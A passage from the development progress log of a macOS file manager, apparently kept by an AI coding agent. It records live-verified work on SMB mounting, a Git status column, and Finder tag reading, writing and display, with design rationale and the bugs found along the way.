  prefilled prompt), `editServer` (rename removes-old-then-saves in place); SFTP path unchanged, SMB path
  mounts then `navigate(to: .local(mountPoint))`, secrets filed only after success, saved only when named.
  `CommandCatalog` `go.connectServer` keywords gained smb/share/mount/nas.
CAPS NOTE: SMB browses as `.local` so it gets full local caps — but `clonefile` returns `ENOTSUP` on SMB
→ `CopyEngine` falls back to chunked cleanly, and Trash either works (NAS `.Trashes`) or surfaces an
error; explicit mount-point cap degradation ([.read,.write,.rename]) was deliberately NOT wired (would
couple `CompositeBackend` to the mounter) — deferred. **NEXT: live-verify against a LAN SMB share**
(mount guest + auth, browse/copy/rename/delete, disconnect-unmounts-only-ours, quit-cleanup); then the
share-picker for a bare `smb://host`, Bonjour `_smb._tcp` discovery (M6-ish), and the deferred cap tweak.

Progress (2026-07-14, M5 SMB pass 2 — VERIFIED LIVE against a LAN Windows SMB box, `192.168.1.50`,
share `Temp`, user `smbtest`): drove the built app end-to-end via computer-use. Confirmed: the Connect
dialog renders both layouts; **SMB address `smb://smbtest@host/Temp` two-way-synced into host/share/user
fields**; guest is refused by the box (auth required — mapped cleanly); an authed mount lands at
`/Volumes/Temp`, appears in the sidebar's Volumes section, and browses via `LocalBackend` (`test.txt`
visible); the named connection persisted to the **Servers** section and **survived relaunch**;
right-click **Connect / Edit… / Remove** all work — Connect re-mounts from the Keychain password (no
re-prompt), **Edit… prefills every field incl. the Keychain secret**; **New Folder (createDirectory)
and Delete Immediately (permanent removeItem) both work over SMB**; a **clean quit unmounts only our
mount**, and an externally-mounted share is **left mounted** on quit (the "unmount only ours" safety
guarantee). TWO bugs found + fixed live: (1) the `NSAlert` accessory collapsed and overlapped the
message — cause was setting `translatesAutoresizingMaskIntoConstraints = false` + sizing the container
by constraints; `NSAlert` sizes an accessory by its **frame**, so the container now keeps an explicit
frame and the grid is pinned top-left inside it; (2) re-connecting an already-mounted share hit NetFS
`EEXIST` (17, empty mountpoints) → added `existingMountPoint(for:)` (matches a mounted volume's
`statfs.f_mntfromname` `//host/share`, case-insensitive) so `mount()` **detects and reuses** an existing
mount (Finder's or ours) instead of re-mounting — which also realizes the "detect already-mounted share"
design goal. CONFIRMED the deferred cap gap is real: **Move-to-Trash (F8) fails on the Windows share**
(error 3328) since SMB carries full local caps; Delete Immediately is the working path. 481 core + 24
app tests green, swiftformat/swiftlint-strict clean. The SMB item is now `[x]`; only the optional
niceties (bare-host share-picker, Bonjour discovery, F8→permanent-delete cap-degradation on SMB mounts)
remain, all deferrable to M6-ish polish.

### M6 — Mac-native power features (M)

- [x] Git awareness: branch in path bar, status column (M/A/?/ignored) via a debounced
      `git status --porcelain` provider; optional .gitignore-aware folder sizes (the one
      optional slice, still deferred)
- [x] Finder tags: ~~column~~ **dots at the right edge of the name**, where Finder puts them (the
      word "column" was written before anyone had looked at Finder; see pass 4), edit from panel,
      filter chips in search
- [x] Terminal drawer: bottom pane following active panel's cwd; "cd sync back" via
      ~~shell integration snippet~~ `proc_pidinfo` (no snippet exists, and none should — see
      pass 7); open in iTerm/Terminal/WezTerm as alternative
- [x] Size visualization mode: toggle panel to ncdu-style bars, computed async, cached
- [x] Share sheet, "Open With" submenu, Services integration
- [x] Automation: AppleScript/Shortcuts verbs (reveal, copy, run-op); user actions —
      shell scripts receiving selection as argv/env, surfaced in palette and F-key bar
- [x] iCloud/provider sync status: ~~column~~ **a badge at the right edge of the name**, outside the
      tag dots — again where Finder puts it (measured, pass 16); ubiquity attrs where available

Exit: git repo browsing shows live status; a user-defined "convert to webp" script on
selection runs from the palette.

Progress (2026-07-15, M6 pass 1 — the Git-awareness core): the pure, tested foundation of the Git
item landed, the same core-first opener every M4/M5 slice used. Box stays `[ ]` (no provider, no
column, no path-bar branch, no app wiring yet) — this is the parse/lookup half. **Four new
`DirnexCore/Services/` files, purely additive** (no existing-API changes, so the app is untouched and
needs no rebuild). Method note: `git`'s real output was **probed live before any Swift was written**
(the pass-7 lesson — `SFTPListingParser` had to be reworked because its format was assumed, not
observed), which caught three things a from-memory parser gets wrong:
- **`GitStatus.swift`** — `GitFileStatus` (`unmodified/modified/added/deleted/renamed/untracked/
  ignored/conflicted`, each with Git's own one-letter `code` — the app picks the colour, this picks
  the character) + `GitStatusEntry` (one porcelain record: `relativePath` + **both** of Git's axes,
  `indexStatus`/`worktreeStatus`, kept verbatim so a later tooltip can say "staged edit plus unstaged
  edits on top" without re-parsing) + `GitBranch` (name/upstream/ahead/behind/isDetached/
  hasNoCommits, for the path bar). `entry.status` collapses the two axes into the one value a column
  renders: untracked/ignored/unmerged are whole-entry verdicts and answer first; otherwise the
  **index column wins when set** (`AM` — staged new, then edited — reads "added", which is more use
  to someone browsing a folder than "modified"), else the worktree column (the common ` M`/` D`).
  Every unmerged shape (`UU`/`AU`/`UA`/`DU`/`UD`/`AA`/`DD`) is one `.conflicted`.
- **`GitStatusSnapshot.swift`** — the per-row lookup a panel does while rendering, so `status(for:)`
  is O(1) and all the work happens once at construction. **(1) Directory roll-up**: Git reports files,
  panels also show the folders holding them → every entry's ancestors are pre-merged by
  `rollupPrecedence` (conflict > modified > added > deleted > renamed > untracked > ignored), so a
  folder advertises the loudest thing inside it. **`.ignored` deliberately does NOT roll up** — a
  source folder holding one ignored `debug.log` is not itself ignored, and painting it `!` would say
  exactly that. **(2) Collapsed-directory inheritance**: Git emits `build/` and says *nothing* about
  the files inside, so a lookup that misses falls back to the nearest untracked/ignored ancestor and
  the contents still read as ignored once you navigate in. **(3)** The repo root itself is never
  painted (its roll-up would mark the `..` row of every dirty repo).
- **`GitStatusParser.swift`** — `-z` output → snapshot. **`-z` is the whole point**: without it Git
  *quotes* any path with a space or a non-ASCII byte (`"caf\303\251.txt"`) and the parser would have
  to reimplement C-string unquoting; with it every field is raw bytes. The cost is two traps, both
  found by probing: **(a) the rename pair** — `-z` emits `R  <new>` NUL `<old>` NUL, i.e. the *reverse*
  of the printed `old -> new`, so reading them in the printed order names every renamed row after the
  file that no longer exists; **(b) the branch header** is NUL-terminated like any entry, not a line.
  Four header shapes captured live and pinned: `main` · `main...origin/main [ahead 1, behind 1]` ·
  `HEAD (no branch)` · `No commits yet on main` (splitting on `...` is unambiguous — refname rules
  forbid `..` in a branch). Malformed fields are skipped, never thrown on: a snapshot missing one
  exotic row still renders a useful panel, whereas throwing blanks the whole column.
- **`GitRepository.swift`** — `repositoryRoot(for:exists:)` walks up for `.git`, **nearest first** (a
  submodule/nested repo wins, matching what `git` itself reports from there), with the filesystem
  reduced to an injected `exists` probe (`ExternalDiffTool`'s shape) so discovery is tested without a
  repository. The probe must be a **plain existence check**: `.git` is a regular *file* in a linked
  worktree or submodule, and a directory check would silently drop Git awareness exactly where people
  use worktrees. `GitCommand` pins the argv (like `SFTPProcessArguments`): **`--no-optional-locks`**
  (a plain `git status` opportunistically rewrites the index under `index.lock`; a poller doing that
  behind the user's back races their own git commands and can fail *their* rebase — this makes the
  read side-effect-free, the same reason editors pass it), `--porcelain=v1 --branch -z`, and
  **`--ignored=traditional`** (one collapsed row for `node_modules/` instead of a hundred thousand).
  **`/usr/bin/git` is deliberately NOT a candidate executable**: it is Apple's `xcrun` shim, and
  spawning it without the Command Line Tools installed pops a modal "install developer tools?" dialog
  — a background poller must never be able to do that to someone who just opened a folder. Candidates
  are Homebrew → CLT → Xcode; none installed ⇒ Git awareness stays off and the column stays blank
  (the same graceful degradation as no diff tool installed).
FINDING (documented, changed the code): the anticipated **unicode trap is a non-issue in Swift** —
macOS hands back decomposed names (`e`+U+0301) while Git, with `core.precomposeunicode` (on by
default), reports the precomposed form, so the two spell one file with different bytes (verified:
their UTF-8 differs). But Swift's `String` compares *and hashes* by **canonical equivalence**, so the
keys are interchangeable in the dictionary for free. The first draft normalized every key with
`precomposedStringWithCanonicalMapping` — which was not just redundant but a **fresh allocation on
every row lookup** in a 100k-row panel's hot path. Removed; a test pins the property instead, since
it is load-bearing and would break in any byte-keyed language.
+63 tests → **544 core tests** (was 481): the parser suite is anchored on a **golden fixture of the
exact bytes captured from git 2.50.1** against a scratch repo built to hold every shape at once.
`swift test` green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE against real repositories**
(a throwaway harness compiled against the core, driving the real `git` binary through `GitCommand`):
the scratch repo parsed every shape incl. the rename-source pairing; the four branch shapes each
confirmed on a purpose-built repo (fresh → `noCommits`, a clone → `ahead=1 behind=1`, detached →
detached); and **Dirnex's own repo** reported branch `Dev` / upstream `origin/Dev` (matching
`git rev-parse`) with the roll-up painting the top-level `DirnexCore` row `?` from files nested four
levels deep, and `.claude`/`build` collapsed to single ignored rows. The NFD-vs-NFC match was proven
live too — the on-disk decomposed name resolved against Git's precomposed key through the real
filesystem. **NEXT (M6 pass 2, the app layer):** a `GitStatusProvider` (`Process`-driven, **debounced**,
off-main, cached per repo root, refreshed on FSEvents + directory change — mirroring
`SpotlightSearchRunner`/`ArchiveMounter`), the **status column** in the panel (per-tab, like the other
columns) and the **branch in the path bar**; then the optional `.gitignore`-aware folder sizes.

Progress (2026-07-15, M6 pass 2 — the app layer; **the Git box closes `[x]`**, only the item's own
"optional" `.gitignore`-aware folder sizes deferred). Three new app files plus one split, and no core
change at all (pass 1's 544 tests stand untouched):
- **`GitStatusProvider.swift`** — spawns `git` off-main through pass 1's `GitCommand`, parses with
  `GitStatusParser`, caches one snapshot per **repository root** (LRU, 8). Shared, not per-pane,
  because the unit of caching is the repository: two panes in one working tree must get one answer
  from one run. **Rate limiting is the whole design, not a nicety** — in a repository the FSEvents
  never stop (a build writes thousands of files, a checkout rewrites the tree), so a request is
  either coalesced into a 300 ms trailing window or, when the snapshot has already been stale for
  2 s, run immediately: a pure trailing debounce starves under a long build's continuous churn and
  would freeze the column for its duration. Runs are serialized per root (a request arriving mid-run
  is replayed once, never spawned alongside). **Pass 1's `--no-optional-locks` turns out to be what
  makes any of this terminate**: without it our own `git status` would rewrite `.git/index`, FSEvents
  would report that as a change, and the pane would ask for another refresh — a spawn loop fed by
  nothing but our own reading.
- **BUG, caught reviewing before the live run:** the "a first look runs immediately" test asked *do
  we have a snapshot*, but a repository `git` refuses to read (dubious ownership, a corrupt index)
  caches none — so every event would count as a first look and spawn `git` again, precisely the storm
  the rate limiting exists to prevent. It now asks *have we ever run this* (`lastRun`), and `forget()`
  deliberately keeps the run stamp when it drops the snapshot; only LRU eviction clears it, which
  correctly makes an aged-out repository a first look again.
- **`PanelViewController+Git.swift`** — per-*tab* root + snapshot (so a tab switch restores the Git
  view along with everything else), per-*pane* watcher. **The pane's existing directory watcher is
  blind to exactly the changes Git status turns on**: `git add` in a terminal, a branch switch, an
  edit in a sibling folder all change what these rows should say while touching nothing under the
  folder on screen — the index and `HEAD` live at the root. So the Git side watches the **root**
  instead, and every pane in that repository coalesces onto the provider's one debounced run. The
  watched root is tracked on the pane, not read back from the tab: a tab switch can leave the tab's
  root unchanged while the pane's watcher was torn down for the other tab (a nil-watcher hole the
  first draft had).
- **The gutter is a *contextual* column** (`Column.isContextual`): a permanently blank "Git" column in
  every folder that isn't a repository — most of them — is clutter, so it exists only inside one,
  sits right after Name, fixed at 20 pt, unsortable (`sortKey` became optional), header "" plus a
  `headerToolTip`. It is **paid for out of the Name column**, never added on top of the table —
  caught by the user on review of the first cut, which appended it and so shoved Size and Date
  sideways on every step into a repository, moving columns they had placed deliberately for a reason
  that has nothing to do with them. Name is the right column to charge because it is already the one
  that absorbs slack (`firstColumnOnlyAutoresizingStyle`); a filename with less room is a truncation,
  not a rearranged pane. (The alternative — drawing the status inside the name cell, VS Code-style —
  was rejected: text colour there is already taken by the mark's bold red and the hidden-file dim,
  and inline rename (F2) replaces that cell's text field with an editable box a badge would have to
  dodge. It would reserve the same 20 pt anyway.) **GOTCHA, and the reason the first fix still
  drifted ~17 pt: `intercellSpacing.width` is 17 pt at this table's `.plain` style, not the 2–3 pt
  the name suggests.** A column costs `width + intercellSpacing`, so the carve must be 37, not 20 —
  established by probing a throwaway `NSTableView` configured exactly like the pane (the same
  measure-don't-assume move as pass 1's `git` probing; the frame returned to its baseline 541.5 only
  once the spacing was included) and read live from the table rather than hardcoded. That is only
  safe because **it never enters a stored layout**: `defaultColumnLayout`
  excludes it and `currentColumnLayout` filters it out, or else every step into a repository would
  look like the user rearranging their columns — and be persisted as such. That same capture also
  **adds the footprint back onto Name**, since while the gutter is installed Name is physically that
  much narrower: storing the carved width would ratchet Name 37 pt smaller on every trip through a
  repository. `applyColumnLayout` lifts the gutter out before the reorder pass and re-installs after:
  that pass moves each stored column to its target index in turn, which drags an unlisted column to
  the far end one move at a time.
  `FileCellView.accentColor` carries the status colour — it outranks the mark's red (a marked
  modified file still shows an orange `M`) and yields to the cursor's emphasized background.
- **BUG the user caught, and the reason the pane has `renderRefresh` at all:** the snapshot-arrived
  path hand-rolled `tableView.reloadData()`, which drops the table's selection — so **crossing a
  repository boundary silently deselected the row**, `..` included. It only ever showed at a
  crossing, because that is the only time the snapshot *changes* (nil ⇄ snapshot); walking around
  inside one repository re-uses it and never reloads. The fix is to stop hand-rolling: an arriving
  snapshot is a live background change like FSEvents or a directory-size total, so it goes through
  `renderRefresh()`, which re-anchors the cursor from the model (the `..` row lives only in
  `cursorOnParentRow`, which the model cannot restore for you) and pointedly does *not* scroll.
  Sobering detail: this was **visible in the pass's own verification screenshots** — every repo pane
  had no highlighted row while the home folder did — and went unnoticed until the user pointed at it.
  A screenshot only verifies what you actually look at.
- **`GitBranchChipView.swift`** — glyph + name + `↑2 ↓1` only when drifted, with a tooltip spelling it
  out. Deliberately **inert**: a click here would be an offer to switch branches, and the only thing
  worse than no Git operations in a file manager is Git operations where a misclick rewrites the
  worktree. It rides *inside* the crumb stack (after the greedy spacer) rather than pinned to the
  bar's edge — `NSStackView` collapses a hidden arranged view, whereas a hidden pinned one keeps
  reserving its width: a branch-shaped hole in the path bar of every folder that isn't a repo.
- GOTCHAS (both recurring, both already on the list): `PathBarView` sat at 496 of the 500-line
  `file_length` limit, so the chip forced splitting the location rendering into
  `PathBarView+Location.swift` — which immediately hit **"Swift `private` doesn't cross files"**
  (`installVirtualLabel` touches the private `crumbStack`), fixed by keeping it beside `installCrumbs`
  and widening only `rebuildCrumbs` to internal. Also swiftlint's `optional_data_string_conversion`
  rejects `String(decoding:as:)` — disabled in place with the reason: the failable initializer it
  prefers answers `nil` for the *whole* output on one non-UTF-8 filename, blanking the column for
  every other row, where lossy decoding costs only that row's key.
+9 app tests → **33** (the hermetic surface: how a branch reads, and the contextual-column invariant;
the subprocess/cache half is non-hermetic and verified live, as with `SMBMounter`). 544 core + 33 app
green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE** against a purpose-built repo holding
every shape at once with a real upstream: the root painted `build` `!` · `deep` `M` (rolled up from a
file **four levels down**) · `scratchdir` `?` (collapsed untracked dir) · `src` `M` (precedence:
modified beats the deleted/renamed/untracked also inside it) · `debug.log` `!`, with `..` blank and
the chip reading `main ↑1 ↓1`; inside `src/`: `added.txt` `A`, `edited.txt` `M`, **`renamed.txt` `R`**
— which proves pass 1's reversed `-z` rename pair end-to-end, since the printed order would have
painted the name that no longer exists — clean files blank, `untracked.txt` `?`. Then **live, with no
navigation**: `git add src/untracked.txt` (an index-only change, nothing under the folder on screen)
flipped `?`→`A`, which is the root watcher earning its existence, and `git checkout -b
feature/live-check` retitled the chip and dropped the arrows. Crossing to **Dirnex's own repo**
re-derived root/snapshot/branch/watcher (`Dev`; `Dirnex` `M`, `DirnexTests` `?`, `DirnexCore` blank —
matching exactly what this pass had touched); leaving for `~/Downloads` took the gutter and chip away;
the right pane never grew a column while the left had one; and the persisted layout after all of that
was still `name`/`size`/`date` alone. Incidental confirmation of a pass-1 decision: this Mac has **no
Homebrew git**, so the CLT candidate is what resolved — and `/usr/bin/git`, excluded as the `xcrun`
shim, is exactly what a naive provider would have spawned. Re-verified after the Name-carve fix: the
Size and Date headers sit at **identical** positions inside and outside a repository (only Name's
sort indicator moves), and four crossings in a row left the stored width at exactly 250.5. Re-verified
after the cursor fix, all four crossings: Cmd+L into a repo keeps the cursor on the first row, Enter
on `..` out of one lands on the folder you came from, and a snapshot landing *on top of* a cursor
parked on `..` (forced by creating an untracked file from a terminal) leaves `..` selected while the
new `?` row appears beneath it.
**NEXT (M6 pass 3):** Finder tags (column, edit from panel, filter chips in search), then the
terminal drawer / size-visualization mode.

Progress (2026-07-15, M6 pass 3 — the Finder-tags core): the pure, tested foundation of the tags
item, the same core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no column, no editor, no
chip UI — this is the value/parse/read-write half). **Two new `DirnexCore/Services/` files plus one
additive field on `SpotlightQuery`.** Method note, and it paid for itself repeatedly: **the stored
format was probed against real tagged files before any Swift was written** (the pass-1 `git` lesson,
and the pass-7 `SFTPListingParser` rework that came of *assuming* a format). Every claim below was
observed, and the first draft of nearly all of them would have been wrong:
- **`FinderTag.swift`** — `FinderTagColor` (the 8 indices) + `FinderTag` (name + colour, parse/
  serialize) + `FinderTagPayload` (the attribute's binary-plist array). The format is
  `com.apple.metadata:_kMDItemUserTags` = a **binary plist array of `name\ncolourIndex` strings**.
  Traps found by probing: **(a) the colour indices are not Finder's display order** — `FavoriteTagNames`
  reads Red, Orange, Yellow, Green, Blue, Purple, Grey, which looks like the enumeration and is not
  it; the real mapping (0 none · 1 Grey · 2 Green · 3 Purple · 4 Blue · 5 Yellow · 6 Red · 7 Orange)
  was established by letting the system assign each colour itself from a bare name. `Grey` resolves,
  `Gray` does not. **(b) A third field exists in the wild**: passing an already-suffixed `Red\n6` to
  `URLResourceValues.tagNames` makes the system treat the *whole string* as the name and append its
  own lookup, storing `Red\n6\n0` — my own first probe wrote corrupt tags this way and they looked
  right. The system reads such rows back as plain `Red`, so fields past the colour are ignored here
  too. **(c) The colour field is optional** (a bare `Plainname` round-trips), and the system always
  *emits* it, `\n0` included — so we emit what it emits. Identity is the **name, case-insensitively**,
  which is the system's own rule (writing `red` stores `red` but resolves to Red's 6), and matches the
  `SavedSearch`/`ServerConnection` name-as-identity precedent. Malformed rows are skipped and a
  nonsense colour degrades to `.none` rather than dropping the tag — the `GitStatusParser` call: one
  bad row must not blank the cell. Duplicates collapse (the system does **not** dedupe on write).
- **`FinderTagStorage.swift`** — the local xattr read/write, in core beside `ByteComparator` per §2.
  **Why it writes the attribute by hand rather than calling `URLResourceValues.tagNames`, the
  documented API — two independent reasons, either sufficient: (1) its setter is macOS 26+ and
  Dirnex targets 14** (caught by the compiler, not by me); **(2) it cannot express a colour** — it
  takes bare names and looks each up in a global database that a write of ours never registers into,
  so expressing an edit through it strips the colour off every custom tag on the file (probed: after
  storing a purple `Zebra`, `tagNames = ["Zebra"]` writes `Zebra\n0`). A data-loss bug wearing the
  documented API's clothes. The getter is available on 14 but drops colours, so it is no use for a
  column either. The one thing the API does that we then must do ourselves is **keep the legacy
  `com.apple.FinderInfo` label byte in sync** — probed: `tagNames = ["Red"]` leaves Spotlight
  reporting `kMDItemFSLabel = 6` where a raw write leaves 0, and the selection rule is **the last
  *coloured* tag wins** (`[Green, Red]`→6, `[Red, Orange]`→7, `[Zebra, Blue]`→4 skipping the
  colourless) — not first, not lowest. Read-modify-write, since the other 31 bytes are type/creator
  codes belonging to whoever wrote them.
- **`SpotlightQuery.tags`** — the chip's pure half; the file's own header comment had anticipated it
  since M4. One `kMDItemUserTags == "Name"c` clause **per tag, ANDed** (kinds OR because a second kind
  broadens; a second tag narrows — the overlap is what the user is asking for). Only names, because
  only names are indexed. **BUG caught while adding it:** `SpotlightQuery` is `Codable` and persisted,
  so a synthesized decoder would throw on the M4-era saved searches that have no `tags` key — which
  would not fail loudly, it would **empty the user's Searches sidebar on upgrade**. Hand-rolled
  `init(from:)` with `decodeIfPresent`, pinned by a test against a literal legacy payload.
MEASURED, and it decides the app pass's architecture: **one `getxattr` costs ~10 µs, tagged or not →
~1 s across a 100k-row directory**, against M1's 150 ms budget for opening one. So tags must **not**
be folded into `LocalBackend.listDirectory`; the column gets the `GitStatusProvider` treatment — off
main, cached, filled asynchronously. (Per *selection* it is nothing, so editing reads inline.)
+44 tests → **588 core tests** (was 544), the payload suite anchored on a **golden fixture of the
exact bytes macOS wrote** for a real tagged file. `swift test` green, swiftformat + swiftlint-strict
clean; app target untouched (new files + one additive field, so no rebuild needed).
**VERIFIED LIVE** — a harness compiled against the real core wrote tags into a real folder, then
**Finder itself** was the judge: the stock `Red` painted a red dot, a custom **purple `Zebra` + `Blue`
rendered as Finder's two-tone split dot**, a colourless `Work` correctly drew **no** dot and left no
FinderInfo record, an incremental add+remove (case-insensitive) preserved the custom purple, Get Info
listed the names, `kMDItemFSLabel` read **6** where a naive raw write leaves 0, and **Spotlight
indexed our tags** — the exact predicate `SpotlightQuery` builds, run verbatim through `mdfind`,
found the file (the search chip, end-to-end). All artifacts removed after.
**FINDING that shapes pass 4, and the reason to look rather than assume:** mid-verification Finder
**silently rewrote our bytes on disk**, `Zebra\n3` → `Zebra`, stripping a colour. It is not
reproducible on demand and a brand-new name (`Quokka\n7`) is adopted, honoured, and rendered orange
in both the dot and the Get Info chip. The consistent explanation: **a colour belongs to the *name*,
system-wide, not to the file** — the system's name → colour database is authoritative, and Finder
reconciles a file's stored copy against it, so `Zebra`, which my own earlier probes had registered as
colourless, got normalized back. Recorded in `FinderTag`'s doc comment: an editor may offer a colour
when *introducing* a tag, but must not present per-file colour as the user's to own — re-colouring
one file's `Work` is not a change macOS keeps. (Exact trigger not pinned down; it is Finder's
business, and the engineering conclusion holds either way.)
**NEXT (M6 pass 4, the app layer):** a `FinderTagProvider` mirroring `GitStatusProvider` (off-main,
cached, FSEvents-refreshed — the ~10 µs/row measurement is why), the **tag column** (dots, and
contextual-vs-always-on is the open question: unlike Git, tags aren't scoped to a repo, so a
permanently-blank column for people who don't tag would be the Git gutter's mistake in reverse),
**editing from the panel** (a tag menu over the selection, offering the seven stock tags + the names
already in use), and the **filter chips** in the search sheet.

Progress (2026-07-15, M6 pass 4 — the Finder-tags app layer): **the box is closed, VERIFIED LIVE.**
Four new app files, one generalized out of the Git pass, and no core change beyond two catalog
commands — the pass-3 core was already the right shape.

**The open question, answered by the user: a View toggle (`Show Tags`), defaulting on** — not the Git
gutter's contextual rule. The rule was tempting (it is right there, tested, one line to reuse) but its
*justification does not transfer*, which is the whole finding: a repository is a coarse, stable
property of a whole subtree, so the gutter appears once on the way in and stays; tagged files are
**scattered**, so the identical rule would install and remove the column — and re-truncate every
filename, since a gutter is paid for out of Name — on nearly every step between sibling folders. A
precedent is an argument, not a licence. The preference is still ANDed with "could these rows carry
tags at all" (local files, and search hits, which are local files in a virtual pane): inside an
archive or on SFTP the column could only ever be blank, which is what the preference exists to avoid.
The checkmark tracks the *preference*, never that derived state — unchecking the box inside a zip
would blame the user's setting for the filesystem's limits.
- **`PanelViewController+ContextualColumns.swift`** — the Git pass's install/footprint/carve
  machinery, lifted out and generalized, because **a second gutter would have silently broken the
  first**: `currentColumnLayout` reclaimed `gitColumnFootprint` specifically, so with two installed it
  would refund half of what it charged and Name would ratchet narrower on every capture — the exact
  bug the reclaim exists to prevent, just slower. Now sums over all installed gutters. Insertion keeps
  `Column.allCases` order among them (Name │ git │ tags │ Size │ Date) whichever arrives first, so
  installing one never reshuffles another. `Column` gained `headerToolTip` (both gutters are too
  narrow to title).
- **`FinderTagProvider.swift`** — `GitStatusProvider`'s shape (off-main, LRU 8, 300 ms debounce or
  run-now past 2 s stale, serialized per key, published by notification) for the reason the core
  *measured*: ~10 µs per `getxattr` is ~1 s across a 100k-row directory. **What differs and why:** its
  unit of caching is the *repository* because one `git status` answers for a whole tree; there is no
  such command for tags, so the unit is the **directory** and the caller passes the paths. The pane
  passes its **whole listing, not its visible rows** — two panes on one folder can have different
  hidden/filter settings, and a scan of the narrower one would evict rows the other still shows,
  leaving tagged files looking untagged. `knownTagNames` accumulates as you browse (there is no API
  for "the user's tags"; the system's list is Finder's own synced plist, not a contract) and feeds
  both the editor menu and the search completion — verified live: `Urgent`, met in one tab, was
  offered in another. **`FinderTagSnapshot.==` is hand-rolled and must be**: `FinderTag`'s own `==`
  compares names case-insensitively and **ignores colour** — correct for identity, wrong for "did the
  pixels change" — so the synthesized version would answer "equal" when Finder recoloured a tag (which
  pass 3 documented it doing *by itself*) and the column would keep painting the old dot.
- **`PanelViewController+Tags.swift`** — per-tab snapshot, install, row lookup. **No watcher of its
  own, unlike Git**: the Git side had to watch the *repository root* because `git add` in a terminal
  changes what rows say while touching nothing under the visible folder; a tag has no elsewhere — it
  is an attribute **on the file** — so the pane's existing directory watcher already fires for it.
  Verified live (a new file appeared and rescanned with the rest).
- **`TagCellView.swift`** — custom-drawn dots; the content *is* the colour, so it borrows neither
  `FileCellView`'s text field nor the Git letter's `accentColor`. Two judgement calls: a **colourless
  tag draws a hollow ring** where Finder draws nothing — Finder can afford that because its dots sit
  beside the name, so absence reads as "no colour", whereas in a column of its own it would read
  "untagged", a lie about a file the user did tag; and on the cursor's emphasized row every dot is
  **ringed in the selection's text colour**, or a blue tag vanishes into blue.
- **`PanelViewController+TagEditing.swift`** — ⌃T (free; ⌘T is New Tab, and ⌃D/⌃Q are where this app's
  popups already live) drops a menu over the cursor row: stock seven + names in use, `.on`/`.mixed`
  per how many targets carry each, toggle across the selection, New Tag…, Remove All Tags. Targets are
  filtered **per entry** (`.local`), not per pane — which is what lets tagging work from a search
  results tab, and makes a mixed selection tag what it can. **The menu offers a colour only when
  *introducing* a name**, per pass 3's finding that colour belongs to the name system-wide: offering
  per-file colour would be offering an edit macOS silently reverts.
- **Search chips** — an `NSTokenField` (a tag *is* a token; it rounds each name into a deletable chip
  and completes against `knownTagNames`). Read via **`stringValue`, not `objectValue`**: the latter
  holds only *tokenized* chips, so a tag typed without a trailing comma would not merely be dropped
  from the search — with a tag as the only term, `isEmpty` would leave **Find disabled** and the
  search unrunnable. Flagged as a risk while writing, then confirmed live both ways.

**BUG FOUND LIVE, and it is the Git pass's own lesson repeating:** ⌘A-then-⌃T dropped the menu at the
*bottom* of the pane, clipped and scrolling. I had anchored on `tableView.selectedRow` — but marks are
independent of the cursor here, so marking everything leaves the table with **no selected row**,
`selectedRow` answers -1, and the `visibleRect` fallback resolves to the pane's lowest edge (the table
is flipped, so `maxY` is the bottom). Fixed to anchor on the **model's** cursor, which always exists
and is the only source that knows about the `..` row. Same root as pass 2's `reloadData` bug: *the
table is a renderer; the model is the truth.*

**VERIFIED LIVE** end-to-end, with macOS itself as the independent judge on both ends — the fixtures
were tagged by **Apple's own writer** (`URLResourceValues.tagNames`, available on this macOS 26 box
though not on Dirnex's 14 floor) and our writes were read back through **Apple's own getter**, which
saw exactly what we wrote. Confirmed: every dot case (stock, multi, 3-dot cap from five, hollow ring
for a colourless `Quokka`, nothing for untagged, white ring on the cursor row); a tag added from the
menu landing on disk as `Green\n2` with **`kMDItemFSLabel = 2`** — the last-*coloured*-tag-wins rule
pass 3 documented, maintained by our hand-written label; a purple `Milestone` across a 6-file marked
set **preserving the existing `Quokka\n0` verbatim** (the exact data loss `tagNames` would have
caused, which is why the core writes by hand); the mixed `−` state; completion offering a custom name
learned by browsing; the chip narrowing `mdfind` to the one file carrying `Urgent`; **dots in the
results panel and ⌃T working there**; the column vanishing inside a zip with ⌃T greyed out; the
toggle taking both panes live; and **both gutters coexisting in the Dirnex repo itself** (Name │ `M`/`!`
│ dots │ Size │ Date). The layout invariant was checked in the persisted store, not by eye: after
repeated toggles and tab switches Name stayed **exactly 279.5** and no `tags` entry ever entered a
stored layout. 588 core + 33 app tests green, swiftformat + swiftlint-strict clean. Test artifacts
removed. Gotcha, recurring: the 4-line hookup tipped `PanelViewController.swift` to **501/500 lines**
(`file_length`) — paid for by tightening my own comment rather than widening a `private` across a
file split, which is the trap that costs more than it saves.

Progress (2026-07-15, M6 pass 5 — tags in the name cell, and the missing right-click menu): user
review of pass 4 killed the tag *column* outright and asked for Finder's actual arrangement, plus the
context menu the app had never had. Both done, VERIFIED LIVE.

**The column is gone; the dots ride at the right edge of the name.** This is the better design and the
user was right to ask for it, but note what it retires: the whole preference question pass 4 agonized
over (contextual vs always-on vs a toggle) was an artefact of the dots *being a column* — a column
must be present or absent for the whole pane, so it had to be blank for non-taggers or jitter. Inside
the name cell the question dissolves: an untagged row draws nothing and gives its name the full width,
so tags cost exactly the rows that have them. `showTags` survives as a plain on/off (the dots are
still someone's clutter to refuse) and `areTagsVisible` still ANDs in "could these rows carry tags",
but the elaborate justification is gone with the column. **Pass 4's generalization of the contextual-
column machinery went with it** — it existed only to host a second gutter, so `+ContextualColumns` was
deleted and `+Git`/`+Columns` restored verbatim from 42e88f2. A generalization with one client is just
a longer way to write the client. **The Git gutter keeps its column and should**: it is *text*,
competing for the name field's colour with the mark's red and the hidden-file dim, and F2 swaps that
field for an editor — none of which applies to a view that draws its own dots.
- **`TagDotsView`** (was `TagCellView`) — an `NSView` inside `FileCellView`, right-aligned, sized by
  `intrinsicContentSize` so Auto Layout hands the name whatever the dots don't need. The name's
  compression resistance is lowered so a long filename truncates *before* the cluster instead of
  running under it. F2 clears `tags` for the row being renamed (a *hidden* view still holds its
  width, so hiding is not enough) — nothing to restore, since the next render sets them like every
  other recycled-cell property.
- **The layout is Finder's, measured not guessed** — a file tagged `Red, Green, Blue, Yellow` was
  written by the system, opened in Finder and zoomed into, and both findings contradict the obvious
  draft: **the dots run in reverse** (the *last* tag is leftmost and whole, each earlier one peeking
  out behind it to the right — the same last-wins precedence the core found in the legacy label byte),
  and they **overlap by ~two thirds**, so five tags stay a compact cluster. The thin gap between dots
  is punched with `.destinationOut` on the view's **own layer** (hence `wantsLayer`): it erases only
  our dots, so the row's real background shows through — a stroke in a fixed colour cannot work,
